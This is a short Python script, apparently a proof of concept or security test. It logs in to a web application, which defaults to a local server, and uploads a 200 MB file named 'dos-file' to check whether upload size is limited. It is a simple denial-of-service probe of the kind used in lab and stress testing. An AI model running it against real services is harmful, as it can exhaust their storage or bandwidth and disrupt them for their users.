#!/usr/bin/env python3
import os, requests, tempfile

BASE = os.getenv('TARGET', 'http://127.0.0.1:5000')
USER = os.getenv('USER', 'user')
PASS = os.getenv('PASS', 'pass')
SIZE_MB = int(os.getenv('SIZE_MB', '200'))

s = requests.Session()
s.post(f"{BASE}/login", data={'username': USER, 'password': PASS}, timeout=10)

with tempfile.NamedTemporaryFile(delete=False) as f:
    f.write(b'A' * (SIZE_MB * 1024 * 1024))
    path = f.name

with open(path, 'rb') as fp:
    files = {'file': ('big.bin', fp, 'application/octet-stream')}
    data = {'name': 'dos-file', 'description': 'stress'}
    r = s.post(f"{BASE}/upload", data=data, files=files, timeout=120)
    print(r.status_code)
    print(r.text[:400])

os.unlink(path)
